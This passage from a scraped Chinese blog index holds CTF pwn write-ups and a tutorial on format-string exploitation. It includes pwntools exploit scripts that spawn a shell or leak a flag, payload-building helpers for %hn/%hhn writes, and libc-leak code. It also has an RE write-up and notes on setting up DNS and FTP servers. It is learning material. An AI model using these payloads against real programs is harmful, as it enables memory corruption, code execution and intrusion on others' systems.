&quot;|&quot;); printf(v1); while ( 1 ) { result = strtok(0, &quot;|&quot;); if ( !result ) break; printf(result); } return result; } 这里因为用strtok做处理，只有一次的传送机会，payload需要用| 分割格式化字符串来完成每次的printf的漏洞利用，稍微麻烦了一下。并且存在后门函数： .text:080485AB push ebp .text:080485AC mov ebp, esp .text:080485AE sub esp, 8 .text:080485B1 ; 3: return system(&quot;/bin/sh&quot;); .text:080485B1 sub esp, 0Ch .text:080485B4 push offset command ; &quot;/bin/sh&quot; .text:080485B9 call _system .text:080485BE add esp, 10h .text:080485C1 nop .text:080485C2 leave .text:080485C3 retn这下可以直接改ret address即可。 gdb分析先观察一下ebp链是否存在 ：是存在的，然后直接利用就好了。看一下，在第一次改ebp2里面的值： 0xffffd338 时，发现下面的第二个只需要改一个字节即可，然后目标就是改成这个栈地址了：然后接着利用漏洞，改一下返回地址到后门函数即可。 （这个题自己在做的时候，先是试着利用第二个的0xffffd2f8 ，这个链发现本地可以打通，远程是不行的，这就是环境因素了，远程由于libc版本的不同，栈结构也是不同的。所以做题还是优先，考虑ebp链，然后没法利用了，在考虑充分利用栈数据，这个通常也是出题人精心设计的栈结构，让你有数据可以利用。） expfrom pwn import * context.log_level = &#39;debug&#39; context.arch = &#39;i386&#39; system_addr = 0x080485B4 tag1 = 0x4c tag2 = 0x85ab io = process(&#39;./xman_2019_format&#39;) # io = remote(&#39;node3.buuoj.cn&#39;,27012) payload = &#39;%{}c%10$hhn|&#39;.format(0x4c) payload += &#39;%{}c%18$hn~&#39;.format(0x85ab) while True: try: io.recvuntil(&#39;...\\n...\\n&#39;) io.sendline(payload) sleep(0.1) io.recvuntil(&#39;~&#39;) io.sendline(&#39;ls&#39;) io.recvline() io.recvline() io.interactive() break except EOFError : io.close() io = process(&#39;./xman_2019_format&#39;) # io = remote(&#39;node3.buuoj.cn&#39;,27012) 需要爆破栈。 suctf-2019-playfmt保护和arch Arch: i386-32-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)开启了RELRO，这样就无法got hijack了 ida分析 gdb分析程序先读入了flag文件，自己可以写一个flag文件测试，并且gdb跟随：其会被读到堆上。紧接着跟到格式化字符串漏洞处：看一下这个堆地址是否被程序操作修改了： gdb-peda$ x/s 0x8050b70 0x8050b70: &quot;flag{f9255a80-e059-4c12-8788-161bf8c6908b}&quot;发现并没有，那就很简单了。攻击思路就是，在栈上构造出这个存放flag的堆地址（计算方式就是在此时的栈上找一个地址来计算偏移获取）。第一步：先修改ebp2上存放的值，改成后面那个框框对应的栈地址，然后在做处理： 0024| 0xffffd318 --&gt; 0xffffd338 --&gt; 0xffffd348 --&gt; 0x8050ba0 --&gt; 0x0此时再修改ebp1上的值，改成刚刚的堆地址 ： 这样exp写的时候，找好偏移%s一下就出来了。 expfrom pwn import * context.log_level = &#39;debug&#39; context.arch = &#39;i386&#39; # io = remote(&#39;node3.buuoj.cn&#39;,27816) io = process(&#39;./1&#39;) io.recvuntil(&#39;Magic echo Server&#39;) io.recvuntil(&#39;=====================\\n&#39;) io.sendline(&#39;%18$p&#39;) io.recvuntil(&#39;0x&#39;) flag = int(io.recv(8),16) print(hex(flag)) key = int((hex(flag))[-4:],16) - 32 -12 -4 print(&#39;key&#39;+ hex(key)) # raw_input(&#39;-&gt;&#39;) io.sendline(&#39;%6$p&#39;) io.recvuntil(&#39;0x&#39;) stack_point = int(io.recv(8),16) + 16 tag1 = int((hex(stack_point))[-2:],16) print(hex(tag1)) payload = &#39;%&#39; + str(tag1) + &#39;c%6$hhn&#39; + &#39;1&#39; raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.recvuntil(&#39;1&#39;) payload = &#39;%&#39; + str(key &amp; 0xffff) + &#39;c%14$hn&#39; + &#39;2&#39; raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.recvuntil(&#39;2&#39;) io.sendline(&#39;%18$s&#39;) io.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"学习记录","slug":"学习记录","permalink":"http://chumen77.xyz/tags/学习记录/"}]},{"title":"修复七千云外链失效","slug":"修复七千云外链失效","date":"2020-03-12T15:17:10.000Z","updated":"2020-03-13T02:48:54.000Z","comments":true,"path":"2020/03/12/修复七千云外链失效/","link":"","permalink":"http://chumen77.xyz/2020/03/12/修复七千云外链失效/","excerpt":"","text":"修复七千云外链失效背景自己的以前申请过一个七千云做自己的图床，今晚写博客发现，自己上传不上图片，并且用upic导出来的链接无法显示图片了。查了很久的原因，发现是七千牛原来给我分配的免费外链域名给我断用了。就是这个没了，自己排错，排了半天才发现。是在这里找到的，好隐蔽。。。然后就在文件管理那里发现，网站提示说如果无法显示图片，加载慢，可以加一个域名。然后我就尝试加了一个，然后就修复好了。 修复过程绑定创建域名xxxx也就是填你的域名，前面的可以自定义。点击添加后下面总是会自动又弹出一个空白的框，点击后面的删除，否则，往下滑你会发现就是创建不了这个记录。创建成功后，会提示你复制CNAME，复制一下，去往你自己的域名网站，我用的是阿里云。 去自己的dns解析平台￼这里的主机记录填入刚刚你自定义的主机开头，记录值填入刚刚复制的CNAME，就可以了。 修改upic设置填入即可，以前写的博客，图片的链接也要改一下，就恢复原来的样子了。","categories":[],"tags":[{"name":"杂项","slug":"杂项","permalink":"http://chumen77.xyz/tags/杂项/"}]},{"title":"格式化字符串漏洞小总结（上）","slug":"格式化字符串漏洞小总结（上）","date":"2020-03-12T13:13:41.000Z","updated":"2020-04-03T09:00:26.012Z","comments":true,"path":"2020/03/12/格式化字符串漏洞小总结（上）/","link":"","permalink":"http://chumen77.xyz/2020/03/12/格式化字符串漏洞小总结（上）/","excerpt":"","text":"格式化字符串漏洞小总结（上）前言记录一下，在学习这个漏洞时候的自己感觉的疑难点，和做题时候的一点小技巧，这一篇主要是记录理论。 格式化字符串基本格式： %[parameter][flags][field width][.precision][length]type 需要重点关注的pattern： parameter ：n$，获取格式化字符串中的指定参数 field width ：输出的最小宽度 precision ：输出的最大长度 length，输出的长度 : hh，1-byte ； h，2-byte ； l, 4-byte ；ll,8-byte ； type : d/i，有符号整数 u，无符号整数 x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母. s，输出以null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。 c，把 int 参数转为 unsigned char 型输出 p， void * 型，输出对应变量的值。printf(&quot;%p&quot;,a) 用地址的格式打印变量 a 的值，printf(&quot;%p&quot;, &amp;a) 打印变量 a 所在的地址。 n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。（仅仅是在这一个printf的函数） %， &#39;%&#39;字面值，不接受任何 flags, width。 参数：就是是要对应输出的变量。 格式化字符串漏洞原理格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。 根据 cdecl 的调用约定,在进入 printf() 函数之前,将参数从右到左依次压栈。进入printf() 之后,函数首先获取第一个参数,一次读取一个字符。如果字符不是 % ,字符直接复制到输出中。否则,读取下一个非空字符,获取相应的参数并解析输出。如上图一样，格式化字符串的参数与后面实际提供的是一一对应的，就不会出现什么问题，但如果在格式化字符串多加几个格式化字符的时候，程序会怎么办呢？此时其可以正常通过编译，并且在栈上取值，按照给的格式化字符来解析对应栈上的值。此时也就发生了格式化字符串漏洞。 漏洞利用泄露内存数据栈上的数据 利用 % order $ p / % order x 来获取指定参数对应栈的内存值 。(常用%p) 利用 % order $ s 来获取指定变量所对应地址的内容，只不过有零截断。(这个在做某些ctf题很好用，当一个程序上来读取一个flag到一个位置，然后你在栈上构造这个位置，直接%s就出来flag了。)任意地址内存当想泄露任意地址内存的时候，就需要想办法把地址写入栈中。在一般情况下，格式化字符串也是存在栈上的，当可控的时候，就可以直接把某个地址写到这个格式化字符串上，然后找下在这个printf函数中对应的栈偏移，然后在用你想用的格式化字符（%p/%x/%s）来操作即可。然后在这个地方，其有个难点就是找对应的栈偏移。在我们实际用的时候，其实就是找栈上的某个位置对应这个格式化字符串的偏移，并且也分为32位于64位，因为其传参是不一样的。确定偏移32位 这是32位的栈对应情况，是比较好理解的。如图，并且发现这些指定参数的（如%4$x),其就是对应找对应栈上内容 ，而不指定的%x其找寻找的时候，是看下前面有个几个对应的无指定格式化字符，就想图上的情况，再给一个%x其是会找到arg4。 64位￼因为64位的参数存放是优先寄存器(rdi,rsi,rdx,rcx,r8,r9)，占满以后第7个参数才会存放在栈上。这就是跟32位找偏移不同地方。 小技巧可以给gdb安装一下pwndbg，在GitHub上面找的到。然后演示一下： #include &lt;stdio.h&gt; int main(){ setvbuf(stdout,0,2,0); char buf[100]; read(0,buf,99); printf(buf); } gdb调试，找图中框框的栈地址，对应的偏移：32位：64位： 注意是对应格式化字符串的偏移。用pwndbg的fmtarg确定偏移，就不用担心数错了。 写地址进栈学会确定偏移后，就可以写地址进栈，来实现读任意地址内存了。经常使用的是，把这个程序中的某个got地址写进栈，然后就可以了来获取其内容，然后在根据其在libc中的偏移就可以计算出libc的基址，进而算出任意一个函数的地址（如system）。 32位：格式：&lt;address&gt;%&lt;order&gt;$s这样就可以尝试读出，adress处对应的值，但是因为是%s，其遇到\\x00就会直接断了，没有想要的输出。更常有的情况就是，会输出一大堆，然后我们想要的地址掺杂在里面，所以可以改进一下，可以加一组标记，然后再去取出来想要，这样也可以来检测是否被\\x00截断了。改进格式：&lt;address&gt;@@%&lt;order&gt;$s@@在使用的时候记得除去 &lt; &gt;。实例： gdb-peda$ got /media/psf/mypwn2/HITCON-Training-master/LAB/lab7/test: file format elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET TYPE VALUE 08049ffc R_386_GLOB_DAT __gmon_start__ 0804a028 R_386_COPY stdout@@GLIBC_2.0 0804a00c R_386_JUMP_SLOT read@GLIBC_2.0 0804a010 R_386_JUMP_SLOT printf@GLIBC_2.0 0804a014 R_386_JUMP_SLOT __stack_chk_fail@GLIBC_2.4 0804a018 R_386_JUMP_SLOT __libc_start_main@GLIBC_2.0 0804a01c R_386_JUMP_SLOT setvbuf@GLIBC_2.0 获取一下got，选择read ： 0x0804a00c ,然后借助pwntools： from pwn import * context.log_level = &#39;debug&#39; io = process(&#39;./test&#39;) payload = p32(0x0804a00c) + &#39;@@%6$s@@&#39; # raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.recvuntil(&#39;@@&#39;) print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4)))) io.interactive() 发现出现了异常。修改代码，查一下read在libc的symbols： from pwn import * context.log_level = &#39;debug&#39; io = process(&#39;./test&#39;) elf = ELF(&#39;./test&#39;) libc = elf.libc payload = p32(0x0804a00c) + &#39;@@%6$s@@&#39; # raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.recvuntil(&#39;@@&#39;) print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4)))) print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;])) io.interactive() 发现就是因为运气不好，这个libc版本里正好read函数是00结尾的，所以换一下:Printf : 0x0804a010这就可以了，并且还可以看出来的确是输出来一堆东西。 64位在64位程序当中，一个地址的高位必定就是0，所以address是不能写到格式化字符串的最前面的，可以跟在fmt后面，但是这里就牵涉到了字节对齐问题，并且其偏移量算起来，当格式化字符串不做padding时，偏移量时会因为格式化字符串的长度而发生变化的。所以较好的做法，就是在格式化字符串处做好padding，这样解决了字节对齐，也解决了偏移量的计算。实例：（还是刚刚的程序编译成64位） payload = &#39;@@%6$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601020) 这次把payload这样写，做好padding，把address写在后面，此时因为偏移会变，gdb调试一下看看，偏移变为多少：可以看出来偏移为11。发现再次运气不好，还是得换一个函数打印got，换成read： from pwn import * context.log_level = &#39;debug&#39; io = process(&#39;./test3&#39;) elf = ELF(&#39;./test3&#39;) libc = elf.libc payload = &#39;@@%11$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601028) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.recvuntil(&#39;@@&#39;) print(&#39;leak-&gt;&#39; +hex(u64(io.recv(6).ljust(8,&quot;\\x00&quot;)))) print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;])) io.interactive() 这样就OK了。 小总结 使用%s 读取内存里的任意位址，%s 会把对应的参数当做 char*指标并将目标做为字符串印出来 使用限制:Stack 上要有可控制 addres 的buffer ;注意由于是当做字符串打印，所以到 0 时就会中断,也要注意32位跟64位address的写在的位置。小技巧0x1想要泄露libc基址，还有就是通过返回__libc_start_main + x(libc版本不一样可能会不一样，本人是ubuntu16.04)算一下偏移是21。from pwn import * context.log_level = &#39;debug&#39; io = process(&#39;./test3&#39;) elf = ELF(&#39;./test3&#39;) libc = elf.libc payload = &#39;%21$p&#39;.ljust(0x8,&#39;a&#39;) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.recvuntil(&#39;0x&#39;) libc_base = int(io.recv(12),16) - 240 - libc.symbols[&#39;__libc_start_main&#39;] print(&#39;leak-&gt;&#39; +hex(libc_base)) io.interactive() 运行这个exp来leak libc的基址：成功了。 0x2泄露stack address ：正如图中所示，会发现栈上说有很多与esp接近的数据，利用合适的数据根据偏移就会拿到esp的值，然后就得到了satck address。常用的也就是多层函数调用时，留下的ebp值。 覆盖内存覆盖内存通常其实就是改写内存，其中分为改写栈上的内存和任意地址的内存，从而来控制程序的执行流程。（这里我先只记录一下任意地址的覆盖，改写栈上的内存暂时用不到）这里面主要是使用%n, %n 转换指示符不输出字符，将 当前printf函数已经成功写入流或缓冲区中的字符个数写入对应的整型指针参数所指的变量。其核心就是：写入的值 = 已经输出的字符数 ，知道这个以后，其使用起来就是控制好在这次%n前输出正确的字符数。 任意地址覆盖 使用方法类似于%s的任意地址读取，只是换成了%n。 使用%xc的办法来控制输出的字符数。基本格式： ....[overwrite addr]....%[overwrite offset]$n其中.... 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。也就是构造一个需要写入的address，然后用%xxc来控制写入的字符数，然后把握好偏移。 fmt字符串写入大小因为%n在一次的写入是在一次当中写入int大小的整数，当使用%xc来控制输出一个int大小的字符个数，这个printf函数会输出十分大的字符数量，这个结果对我们说十分不利的，一方面远端程序输出以后，自己接收是一个问题，是十分不稳定的，并且无法精准的控制需要修改的地方。所以常用的是%hn 和%hhn，分别写入short和char大小的整数，然后分成多次写入以组合成完整的int整数，这个过程是十分稳定的。 单次printf多次写入在进行GOT hijack或者改掉某一个指标的时候，通常会要求一次printf内就要来改写完成，不然改一半的值这个指标再被使用时程序很容易崩溃。所以就可以把多个格式化字符串结合在一次，例如： %xc%offset1$hn %yc%offset2$hn address address+2 但这样就说需要小心偏移，并且输出的字符数也要控制好。难点也在控制这个多次写入时，c前面应该填多少的值。 多次写入时控制输出的字符数要注意的是%n写入的值是其前面输出的字符数。 第一次%xc%hhn的时候，要扣掉前面摆放的address的长度。比如32位时，其前面会摆放4个地址，这个时候就是x需要减去4x4 = 16. 之后每个%xc 必需扣掉前一个写入 byte 的值总字符数才会是这个写入需要的长度。比如 第一次写入值为 90 第二个写入 120 此时应为%30c% offset$hhn 当某一次写入的值比前面写入的要小的时候，就需要整数overflow回来。比如：需要写入的一个字节，用的是hhn的时候，前面那次写入的是0x80，这次写入的是0x50，这时候就用0x50可以加上0x100（256）=0x150 （这时候因为是hhn，在截取的时候就是截取的0x50）， 再减去0x80 = 0xD0（208），也就是填入%208c%offset$hhn即可。 当然这也是很规律的，在控制一个输出字符数，就分为3种情况： 前面已经输出的字符数小于这次要输出的字符数 前面已经输出的字符数等于于这次要输出的字符数 前面已经输出的字符数大于这次要输出的字符数 然后就可以写成一个脚本来实现自动化控制这个输出字符数： 单字节： # prev 前面已经输出多少字符 # val 要写入的值 # idx 偏移 def fmt_byte(prev,val,idx,byte = 1): result = &quot;&quot; if prev &lt; val : result += &quot;%&quot; + str(val - prev) + &quot;c&quot; elif prev == val : result += &#39;&#39; else : result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot; result += &quot;%&quot; + str(idx) + &quot;$hhn&quot; return result #搭配： prev = 0 payload = &quot;&quot; # x就是你要写入的字节数，例如在改写64位got时常用是6，因为其前两个字节都一样 # idx是偏移，key是要写入的目标值 for i in range(x): payload +=fmt_byte(prev,(key &gt;&gt; 8*i) &amp; 0xff,idx+i) prev = (key &gt;&gt; i*8) &amp; 0xff 双字节： #跟上个基本一样，只是改了部分地方 def fmt_short(prev,val,idx,byte = 2): result = &quot;&quot; if prev &lt; val : result += &quot;%&quot; + str(val - prev) + &quot;c&quot; elif prev == val : result += &#39;&#39; else : result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot; result += &quot;%&quot; + str(idx) + &quot;$hn&quot; return result prev = 0 payload = &quot;&quot; for i in range(x): payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,idx+i) prev = (key &gt;&gt; i*16) &amp; 0xffff 在使用这两个脚本的时候，常用的是在获取到payload的时候也用payload.ljust()做好padding,来控制好字节对齐，然后再摆上需要写入x组的地址。（一会在题目中会有演示） pwntools pwnlib.fmtstr 模块pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;) offset (int):你控制的第一个格式化程序的偏移量 writes (dict):格式为 {addr: value, addr2: value2},用于往 addr 里写入 value (常用:{printf_got}) numbwritten (int):已经由 printf 函数写入的字节数 write_size (str):必须是 byte,short 或 int。限制你是要逐 byte 写,逐 short 写还是逐 int 写(hhn,hn或n) 这个函数是十分好用的，具体可以去看一下pwntools的官方介绍，但是实际使用当中，会发现几个问题： 在64位中，并不好用，自动生成的payload中，它不会将地址放在格式化字符串之后，导致用不了。 在面对单次printf，实施多次写入的时候其更显的十分无力。 记录到这里，理论部分就差不多完了，下一篇主要记录的就是题解篇，会包含一些技巧，常见的ctf格式化字符串题目漏洞利用的常见套路，还有格式化字符串漏洞的高级利用（当格式化字符串漏洞的buf在bss上，这就意味着我们无法直接往栈上写地址，该怎么办？并且这种题目常在赛题中出现）","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"学习记录","slug":"学习记录","permalink":"http://chumen77.xyz/tags/学习记录/"}]},{"title":"XCTF\\_高校战疫赛\\_RE-天津垓","slug":"XCTF_高校战疫赛_RE_ 天津垓","date":"2020-03-11T13:06:03.000Z","updated":"2020-03-15T06:37:40.000Z","comments":true,"path":"2020/03/11/XCTF_高校战疫赛_RE_ 天津垓/","link":"","permalink":"http://chumen77.xyz/2020/03/11/XCTF_高校战疫赛_RE_ 天津垓/","excerpt":"","text":"XCTF_高校战疫赛_RE_ 天津垓_前言复现一个题，当时只做出来第一层加密。因为还没怎么接触反调试跟代码混淆，做不下去了，不过下来复现发现了较为简单的办法出来这个题，也是学到很多，就记录一下。 初步运行发现还需要装个cgwin1.dll，这个很好找，不过要注意64位系统，windows目录下的system32 跟syswow64都要放入。看来是需要输入判断。 ida分析这里就是第一层验证了，后来了解到这个是smc加密，我是直接写Python一位位爆破出来的。 v39 = &#39;Rising_Hopper!&#39; result = &#39;&#39; key = [17,8,6,10,15,20,42,59,47,3,47,4,16,72,62,0,7,16] tag = [0x52,0x69,0x73,0x69,0x6E,0x67,0x5f,0x48,0x6f,0x70,0x70,0x65,0x72,0x21] for i in range(len(key)): x = 0 flag = 1 while flag: if ~(x &amp; tag[i % 14]) &amp; (x | tag[i % 14])==key[i] : flag = 0 result += chr(x) else: x += 1 print(result) #result = &#39;Caucasus@s_ability&#39; 然后进入这个函数，发现这里根据刚刚解出来的字符串，传入后对*Unk_10040164D * 做了一些处理然后又返回到这堆数据。直接跟进去是没什么用的。所以需要动态调试，看看程序运行到这里，是怎么样的。 然后会发现，ida动态调试直接断掉了，肯定是有反调试了。x64可以调试，但是定位关键处有点难，并且看汇编代码也让自己这个菜鸡看吐了。所以就想办法破除对ida的反调试，然后到了关键代码也就是处理以后的Unk10040164D，看看逻辑是也想办法将其改变成伪代码，这样就好分析多了。 patch程序￼跟进入引用函数，发现是利用窗口事件来检测是否被调试器调试。并且在其中也发现了ida，这里patch程序可以用010editor，直接把ida的相关字眼改成其他的就行。但是要注意不要破坏其他的数据：￼我起初改成这样就不行，位位对齐，改成其他字符串就好了。 ida动态调试：断在这里，然后进入这入Unk10040164D 函数的时候，F7进入：发现已经有正常的汇编代码出来了（这里我的是已经修改过的），无法f5反编译，这时候可以在最初段push rbp 上面，右键新建一个函数：整完的样子：然后就可以f5反编译了，并且很清晰的就可以看出程序逻辑：然后解密这里： flag = &#39;&#39; key = [2007666,2125764,1909251,2027349,2421009,1653372,2047032,2184813,2302911,0x2289F9,1909251,2165130,1968300,0x223D16,2066715,2322594,1987983,0x223D16,1869885,2066715,0x2289F9,1869885,0xEB773,0xE6A90,0xE6A90,0xE6A90,728271,1869885,0x2289F9,2283228,0x223D16,2184813,2165130,2027349,1987983,0x223D16,1869885,2283228,2047032,1909251,2165130,1869885,2401326,1987983,0x223D16,2184813,885735,2184813,2165130,1987983,2460375] for i in range(51) : flag += chr(int(key[i] / 19683)) print(flag) 然后就拿到flag了。比起很多大师傅的dump核心代码，再进行分析，对我来说还是太难了。感觉在ida里到关键处，创建函数，生成伪代码更简单，也很清晰。","categories":[],"tags":[{"name":"RE","slug":"RE","permalink":"http://chumen77.xyz/tags/RE/"}]},{"title":"linux- DNS搭建记录","slug":"linux_ DNS搭建记录","date":"2020-03-11T06:20:55.000Z","updated":"2020-04-15T14:18:11.128Z","comments":true,"path":"2020/03/11/linux_ DNS搭建记录/","link":"","permalink":"http://chumen77.xyz/2020/03/11/linux_ DNS搭建记录/","excerpt":"","text":"DNS全称： domain name system 域名服务基础DNS作用及类型DNS 系统的作用 ： 正向解析：根据主机名称（域名）查找对应的 IP 地址（最常见） 反向解析：根据 IP 地址查找对应的主机域名（通信行业常用） DNS 系统的工作模式： 递归查询 ：访问必须有一次一回，会返回成功或者失败。 迭代查询 ：多次访问，多次返回，必须返回一个正确的地址。域名结构：全世界有13台根域名服务器。BIND软件服务 服务名：named 端口号：53 主配置文件：/etc/named.conf 保存 DNS 解析记录的数据文件位于：/var/named/ 主配置文件部分参数：listen-on port 53 { 127.0.0.1; }; //要填入自己主机ip listen-on-v6 port 53 { ::1; }; allow-query { any; };//意思是给任何网段进行解析 分别是: ipv4监听端口和ip地址，默认只有本地的 ipv6的监听端口和ip地址 recursion yes; // 递归还是迭代查询 dnssec-enable yes; dnssec-validation yes; dnssec-lookaside auto; 这个是dns控制防止欺骗用户。但是因为其加上了包的验证，再传给服务器时候，服务器进行拆包验证，会增加服务器的负荷，所以用的不多。 区域文件部分参数： zone &quot;baidu.com&quot; IN { type master; file &quot;baidu.localhost&quot;; //本机记录文件名称（可以diy） allow-update { none; }; }; //正向 zone &quot;131.140.168.192.in-addr.arpa&quot; IN { type master; file &quot;baidu.empty&quot;; allow-update { none; }; }; //反向 //对于其中 file 自定义的名字，要与数据配置文件里面名字相同。 实验搭建过程要求：www主机解析为172.16.10.5；ftp主机解析为172.16.10.6：mail主机解析为172.16.10.8：DNS主机解析为本机IP172.16.10.9；添加泛解析记录；同时添加www的别名记录ns1 服务器主机关闭防火墙、SELinuxvi /etc/selinux/config 把改成 SELINUX = disabled 然后setenforce 0 systemctl stop firewalld.service 关闭防火墙。 配置主配置文件：vi /etc/named.conf ￼注意分号不要忘记，ip填的是本机地址。 配置区域文件vi /etc/named.rfc1912.zones zone &quot;chumen77.com&quot; IN { type master; file &quot;chumen77.localhost&quot;; allow-update { none; }; }; zone &quot;10.16.172.in-addr.arpa&quot; IN { type master; file &quot;chumen77.loopback&quot;; allow-update { none; }; }; 其中注意反向解析时，ip地址的反写，还有写到ip地址第三个段。 并且正向解析和反向解析的文件名字要给记住，一会需要去按名称配置的。 配置正向反向解析数据文件cp -p /var/named/named.localhost /var/named/chumen77.localhost cp -p /var/named/named.empty /var/named/chumen77.loopback -p 是用来复制文件的权限情况。 来拷贝一下，方便直接修改。 正向解析文件 ： $TTL 1D @ IN SOA chumen77.com. rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS dns.chumen77.com. www IN A 172.16.10.5 ftp IN A 172.16.10.6 mail IN A 172.16.10.8 dns IN A 172.16.10.131 ns1 IN CNAME www * IN A 172.16.10.10 反向解析文件： $TTL 3H @ IN SOA chumen77.com. rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS dns.chumen77.com. 5 PTR www.chumen77.com. 6 PTR ftp.chumen77.com. 8 PTR mail.chumen77.com. 131 PTR dns.chumen77.com. * PTR xxx.chumen77.com. 注意每个网址后面要加个点。 检查和开启named-checkzone 可以对上面4个配置文件进行语法问题的检查，出现ok就是没什么问题了。 systemctl start named 开启服务，如果出现无法开启，有异常： cat /var/log/messages 用这个命令去查那个配置文件里面的内容填错了，然后改一下就ok了。 客户机设置网卡设置vi /etc/sysconfig/network-scripts/ifcfg-ens33 修改网卡信息 ： DNS1=192.168.140.131 要在最后加上你dns服务器的ip。注意是 DNS1. 设置好后重启网卡。 service network restart 测速是否成功使用一下 nslookup 正向反向都成功了。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://chumen77.xyz/tags/linux/"}]},{"title":"linux\\_ftp服务搭建踩坑记录","slug":"linux_ftp服务搭建简单记录","date":"2020-03-11T05:46:50.000Z","updated":"2020-06-15T15:06:23.691Z","comments":true,"path":"2020/03/11/linux_ftp服务搭建简单记录/","link":"","permalink":"http://chumen77.xyz/2020/03/11/linux_ftp服务搭建简单记录/","excerpt":"","text":"linux_ftp服务搭建简单记录_前言简单记录一下，ftp的相关需要记录的知识跟搭建所踩的坑。 两种服务模式 主动模式：FTP服务器主动向客户端发起连接请求。 被动模式：FTP服务器等待客户端发起连接请求（FTP的默认工作模式）。vsftpd服务程序ftp是Linux系统中以命令行界面的方式来管理FTP传输服务的客户端工具。我们首先手动安装这个ftp客户端工具，以便在后续实验中查看结果。vsftpd作为更加安全的文件传输的服务程序，允许用户以三种认证模式登录到FTP服务器上。 匿名开放模式：是一种最不安全的认证模式，任何人都可以无需密码验证而直接登录到FTP服务器。 本地用户模式：是通过Linux系统本地的账户密码信息进行认证的模式，相较于匿名开放模式更安全，而且配置起来也很简单。但是如果被黑客破解了账户的信息，就可以畅通无阻地登录FTP服务器，从而完全控制整台服务器。 虚拟用户模式：是这三种模式中最安全的一种认证模式，它需要为FTP服务单独建立用户数据库文件，虚拟出用来进行口令验证的账户信息，而这些账户信息在服务器系统中实际上是不存在的，仅供FTP服务程序进行认证使用。这样，即使黑客破解了账户信息也无法登录服务器，从而有效降低了破坏范围和影响。安装yum -y install vsftpd 配置文件主配置文件路径 ： /etc/vsftpd/vsftpd.conf 常用的配置参数以及作用如下： 参数 作用 listen=[YES|NO] 是否以独立运行的方式监听服务 listen_address=IP地址 设置要监听的IP地址 listen_port=21 设置FTP服务的监听端口 download_enable＝[YES|NO] 是否允许下载文件 userlist_enable=[YES|NO] 设置用户列表为“允许”还是“禁止”操作 userlist_deny=[YES|NO] 设置用户列表为“允许”还是“禁止”操作 max_clients=0 最大客户端连接数，0为不限制 max_per_ip=0 同一IP地址的最大连接数，0为不限制 anonymous_enable=[YES|NO] 是否允许匿名用户访问 anon_upload_enable=[YES|NO] 是否允许匿名用户上传文件 anon_umask=022 匿名用户上传文件的umask值 anon_root=/var/ftp 匿名用户的FTP根目录 anon_mkdir_write_enable=[YES|NO] 是否允许匿名用户创建目录 anon_other_write_enable=[YES|NO] 是否开放匿名用户的其他写入权限（包括重命名、删除等操作权限） anon_max_rate=0 匿名用户的最大传输速率（字节/秒），0为不限制 local_enable=[YES|NO] 是否允许本地用户登录FTP local_umask=022 本地用户上传文件的umask值 local_root=/var/ftp 本地用户的FTP根目录 chroot_local_user=[YES|NO] 是否将用户权限禁锢在FTP目录，以确保安全 local_max_rate=0 本地用户最大传输速率（字节/秒），0为不限制 在配置着的时候，注意对在这里对应起来，来控制匿名模式跟本地用户的部分权限。 开启vsftpd服务service vsftpd start systemctl start vsftpd 踩坑记录0x1 ：因为是实验机，随便折腾，为了实验的成功，需要关闭防火墙 和SELinux服务。 防火墙：CentOS7.0版本的linux系统的防火墙是firewalld，其他版本的可能是iptables。firewalld防火墙关闭代码： 关闭防火墙systemctl stop firewalld.service 永久禁止防火墙 systemctl disable firewalld.service 检查防火墙状态 systemctl status firewalld.service 提示：Active: inactive (dead)就表示关闭了。 iptables防火墙关闭代码 ： 查询防火墙状态 : service iptables status 停止防火墙 : service iptables stop 启动防火墙 : service iptables start 重启防火墙 : service iptables restart 永久关闭防火墙 : chkconfig iptables off 永久关闭后启用 : chkconfig iptables on SELinux服务：setsebool -P ftpd_full_access=on单独处理ftpd。 或：关闭SELinux $ vi /etc/selinux/config 将 SELINUX=XXX –&gt;XXX 代表级别改为** SELINUX=disabled**然后重启系统，或者执行命令：setenforce 0。 0x2:发现匿名用户，在连上ftp服务器时候，无法进行写入东西。 550 Permission denied. 然后这个目录是: /var/ftp/pub 这就是把这个pub的属主控制为 控制为ftp即可。 chown ftp pub 这样就可以了。 0x3:在本地用户的时候，用root也是无法连接ftp服务的。这是因为vsftpd服务程序所在的目录中默认存放着两个名为“用户名单”的文件（ftpusers和user_list）把ftpusers这里面的root去掉即可。 0x4: 